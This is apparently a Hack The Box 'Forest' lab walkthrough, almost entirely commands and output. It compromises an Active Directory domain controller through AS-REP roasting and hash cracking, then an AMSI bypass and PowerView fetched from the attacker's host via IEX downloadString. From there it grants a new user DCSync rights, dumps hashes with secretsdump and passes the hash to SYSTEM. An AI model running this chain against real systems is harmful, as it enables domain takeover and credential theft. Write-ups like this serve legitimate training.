# forest: https://app.hackthebox.com/machines/Forest

```bash
nmap -sC -sV 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.081s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-26 19:13:51Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-04-26T19:13:59
|_  start_date: 2023-04-26T19:11:50
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-04-26T12:13:57-07:00
```

```bash
cat /etc/hosts | grep 10.10.10.161
10.10.10.161	forest.htb.local
```

```bash
crackmapexec smb 10.10.10.161 -u '' -p '' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```bash
impacket-GetADUsers -dc-ip 10.10.10.161 "htb.local/" -all > getadusers_output  

cat getadusers_output | grep -v "HealthMail\|SM_\|\$33"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 10.10.10.161 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2023-04-26 15:21:33.537580 
Guest                                                 <never>              <never>             
DefaultAccount                                        <never>              <never>             
krbtgt                                                2019-09-18 06:53:23.467452  <never>             
sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
lucinda                                               2019-09-19 20:44:13.233891  <never>             
svc-alfresco                                          2023-04-26 15:35:13.226537  2019-09-23 07:09:47.931194 
andy                                                  2019-09-22 18:44:16.291082  <never>             
mark                                                  2019-09-20 18:57:30.243568  <never>             
santi                                                 2019-09-20 19:02:55.134828  <never>       
```

```bash
cat users.txt     

Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

```bash
impacket-GetNPUsers -dc-ip 10.10.10.161 -request "htb.local/" -format john   
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-04-26 15:42:29.227426  2019-09-23 07:09:47.931194  0x410200 

$krb5asrep$svc-alfresco@HTB.LOCAL:0fc57717870808fae5870bbf923f0553$7b6eaa5eeada7cb3e8c542ed18c6cdf2acf21fed87d309abb1021b42b0d8cddfe6882432a3aa4edda405a7937051676fa6db8faa3a3819b47b55714998562150815264f56d5cbc6eaa3cb589759486c8da990bac9d813e7fc75629e38157c60cc8417eb1452839af3fc9251f1c61b5ce5170570588bf30306a29a9fba6e1a4bfa7af36e883dfbe6744c477ca51faa40b77d68da899f11f233351eb05e680fd9471cc81c43d8c960197daa32703bd73b279b978b4846e6c84561a287e67a69f72996c39774990b347976589bccde68f2ff793547f00e855d5031ca8a1a6634e178417eb3e1527
```

```bash
cat svc-alfresco.hash 
$krb5asrep$svc-alfresco@HTB.LOCAL:0fc57717870808fae5870bbf923f0553$7b6eaa5eeada7cb3e8c542ed18c6cdf2acf21fed87d309abb1021b42b0d8cddfe6882432a3aa4edda405a7937051676fa6db8faa3a3819b47b55714998562150815264f56d5cbc6eaa3cb589759486c8da990bac9d813e7fc75629e38157c60cc8417eb1452839af3fc9251f1c61b5ce5170570588bf30306a29a9fba6e1a4bfa7af36e883dfbe6744c477ca51faa40b77d68da899f11f233351eb05e680fd9471cc81c43d8c960197daa32703bd73b279b978b4846e6c84561a287e67a69f72996c39774990b347976589bccde68f2ff793547f00e855d5031ca8a1a6634e178417eb3e1527
```

```bash
ohn svc-alfresco.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2023-04-26 15:39) 0.3344g/s 1366Kp/s 1366Kc/s 1366KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice
[+] IP: 10.10.10.161:445	Name: forest.htb.local                                  
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

```

```bash
type user.txt
426b410bfe7f2c06e2be6ddfc0b0e847
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> [Environment]::Is64BitOperatingSystem
True
```

```bash
ls winPEASx64.exe 
winPEASx64.exe

python -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> curl http://10.10.16.6:7070/winPEASx64.exe -o winPEASx64.exe

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir

    Directory: C:\Users\svc-alfresco\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/26/2023   1:08 PM        2025984 winPEASx64.exe

```

```bash
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.10.10.161 -c All

INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 35 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 42S
```

```bash
sudo neo4j console

[sudo] password for joker: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
.
.snipped
.
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user joker2 joker123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" joker2 /add 
The command completed successfully.

```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> menu
.
.snipped
.
.Bypass-4MSI
.
.snipped
.
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!

```

```bash
python -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:9998/PowerView.ps1')

```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" joker2 /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'joker123' -AsPlainText -Force

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\joker2', $SecPassword)

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity joker2 -Rights DCSync

```
```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/joker2:joker123@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
.
.snipped
.
```

```bash
impacket-psexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file ZfCnpPOa.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service eAhS on 10.10.10.161.....
[*] Starting service eAhS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```bash
C:\Users\Administrator\Desktop> type root.txt
edad9695be327279c50f0a4276399ea3
```
